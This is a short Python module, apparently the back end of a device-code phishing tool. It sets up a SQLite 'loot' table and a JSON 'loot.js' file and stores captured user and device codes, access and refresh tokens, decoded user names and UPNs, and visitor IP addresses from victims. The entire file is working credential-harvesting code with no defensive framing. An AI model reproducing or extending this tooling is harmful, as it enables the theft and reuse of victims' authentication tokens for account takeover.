from locks import file_lock
import sqlite3
import os
import logging
import json

DB_FILE = "/app/data/loot.db"
LOOT_FILE = "/app/data/loot.js"

def init_db():
    try:
        os.makedirs(os.path.dirname(DB_FILE), exist_ok=True)
        conn = sqlite3.connect(DB_FILE)
        cursor = conn.cursor()
        logging.info("Initializing the database...")

        # Crea la tabella se non esiste
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS loot (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_code TEXT,
                device_code TEXT,
                resource TEXT,
                access_token TEXT,
                refresh_token TEXT,
                decoded_name TEXT,
                decoded_upn TEXT,
                visitor_ip TEXT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
            )
        """)
        conn.commit()
        conn.close()
        logging.info("Database initialized successfully.")
    except Exception as e:
        logging.error(f"Database initialization failed: {e}")


def save_to_db(data, visitor_ip):
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()

    cursor.execute("""
        INSERT INTO loot (
            user_code, device_code, resource, access_token,
            refresh_token, decoded_name, decoded_upn, visitor_ip
        )
        VALUES (?, ?, ?, ?, ?, ?, ?, ?)
    """, (
        data.get("user_code"),
        data.get("device_code"),
        data.get("resource"),
        data.get("access_token"),
        data.get("refresh_token"),
        data.get("decoded_name"),
        data.get("decoded_upn"),
        visitor_ip
    ))

    conn.commit()
    conn.close()


def save_to_file(data):
    os.makedirs(os.path.dirname(LOOT_FILE), exist_ok=True)

    with file_lock:
        if os.path.exists(LOOT_FILE):
            with open(LOOT_FILE, "r") as file:
                try:
                    file_data = json.load(file)
                except json.JSONDecodeError:
                    file_data = []
        else:
            file_data = []

        file_data.append(data)
        with open(LOOT_FILE, "w") as file:
            json.dump(file_data, file, indent=4)
        #logging.info(f"Dati salvati su {LOOT_FILE}: {data}")
